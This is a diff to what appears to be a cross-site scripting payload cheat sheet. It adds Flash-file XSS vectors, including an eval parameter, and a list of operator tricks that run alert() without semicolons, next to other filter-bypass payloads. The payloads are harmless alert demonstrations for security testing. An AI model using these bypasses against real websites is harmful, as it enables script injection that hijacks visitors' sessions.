@@ -163,6 +163,13 @@ XSS in SWF
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
 IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
+
+
+InsecureFlashFile.swf
+location to url: InsecureFlashFile.swf?a=location&c=http://www.google.com/
+open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
+http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
+eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
 ```
 
 more payloads in ./files
@@ -260,7 +267,6 @@ Bypass parenthesis for string - Firefox
 alert`1`
 ```
 
-
 Bypass onxxxx= blacklist
 ```
 <object onafterscriptexecute=confirm(0)>
@@ -288,12 +294,31 @@ Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
 <img src='1' onerror='alert(0)' <
 ```
 
-Bypass using an alternate way to execute js
+Bypass using an alternate way to execute an alert
 ```
 <script>window['alert'](0)</script>
 <script>parent['alert'](1)</script>
 <script>self['alert'](2)</script>
 <script>top['alert'](3)</script>
+```
+
+Bypass ';' using another character
+```
+'te' * alert('*') * 'xt';
+'te' / alert('/') / 'xt';
+'te' % alert('%') % 'xt';
+'te' - alert('-') - 'xt';
+'te' + alert('+') + 'xt';
+'te' ^ alert('^') ^ 'xt';
+'te' > alert('>') > 'xt';
+'te' < alert('<') < 'xt';
+'te' == alert('==') == 'xt';
+'te' & alert('&') & 'xt';
+'te' , alert(',') , 'xt';
+'te' | alert('|') | 'xt';
+'te' ? alert('ifelsesh') : 'xt';
+'te' in alert('in') in 'xt';
+'te' instanceof alert('instanceof') instanceof 'xt';
 ```
 
 Bypass using Unicode
